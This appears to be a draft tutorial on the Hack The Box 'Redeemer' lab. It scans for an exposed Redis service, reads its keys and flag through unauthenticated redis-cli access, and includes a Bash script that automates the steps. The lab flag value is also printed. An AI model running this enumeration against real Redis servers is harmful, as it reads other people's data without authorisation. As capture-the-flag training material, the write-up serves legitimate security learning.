---
title: "Exploiting HTB’s ‘Redeemer’ Box with Redis Misconfiguration"
published: false
tags: [hackthebox, redis, pentesting, tutorial]
---

## Introduction

In this tutorial, we’ll exploit a publicly exposed Redis service on Hack The Box’s **Redeemer** machine. You’ll learn to:

- Discover Redis with `nmap`
- Interact with Redis using `redis-cli`
- List keys and extract values (including the flag)
- Automate the entire flow in a Bash script

## Prerequisites

- Basic Linux command‑line skills
- Kali Linux (or any distro with `nmap` & `redis-cli`)
- Active HTB VPN connection

---

## 1. Scan for Redis

First, identify the open Redis port:

```bash
nmap -p 6379 -sV 10.129.136.194 -oN nmap-6379.txt
```

<details>
<summary>Output snippet</summary>

```text
6379/tcp open  redis  Redis key-value store 5.0.7
```
</details>

![Nmap Redis Scan](https://raw.githubusercontent.com/keyfive5/obsidiansignal-htb-redeemer/main/screenshots/nmap-6379.png)

---

## 2. Connect & Inspect

Use `redis-cli` to connect and gather server info:

```bash
redis-cli -h 10.129.136.194 info | tee redis-info.txt
```

<details>
<summary>Key output</summary>

```text
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```
</details>

![Redis INFO](https://raw.githubusercontent.com/keyfive5/obsidiansignal-htb-redeemer/main/screenshots/redis-info.png)

---

## 3. Retrieve the Flag

Select the database, list all keys, and get the flag:

```bash
redis-cli -h 10.129.136.194
> select 0
> keys *
1) "flag"
2) "temp"
3) "stor"
4) "numb"
> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

![Flag Retrieval](https://raw.githubusercontent.com/keyfive5/obsidiansignal-htb-redeemer/main/screenshots/get-flag.png)

---

## 4. Automation Script

Save the following as `scripts/enum-redis.sh` to automate the process:

```bash
#!/usr/bin/env bash
# Usage: ./enum-redis.sh <TARGET_IP>

TARGET=$1

echo "[*] Scanning for Redis..."
nmap -p 6379 -sV $TARGET -oN nmap-6379.txt

echo "[*] Gathering Redis INFO..."
redis-cli -h $TARGET info | tee redis-info.txt

echo "[*] Listing keys..."
redis-cli -h $TARGET --raw keys '*' | tee keys.txt

echo "[*] Retrieving flag..."
FLAG=$(redis-cli -h $TARGET get flag)
echo "[*] Flag: $FLAG"
```

Run it with:

```bash
bash scripts/enum-redis.sh 10.129.136.194
```

---

## 5. Lessons Learned

- **Public Redis** installations often allow unauthenticated access by default.
- Always run `INFO` and `KEYS *` to enumerate available data.
- Automate repetitive enumeration tasks with simple Bash scripts.

---

## Conclusion & Next Steps

You’ve now owned HTB’s Redeemer box by exploiting a Redis misconfiguration in under five commands. Next, consider:

- Integrating Redis checks into your Recon automation.
- Exploring authenticated Redis attacks (ACLs, password brute‑forcing).
- Leveling up with lateral‑movement and persistence labs.

🔗 **Full write‑up & code:** https://github.com/keyfive5/obsidiansignal-htb-redeemer
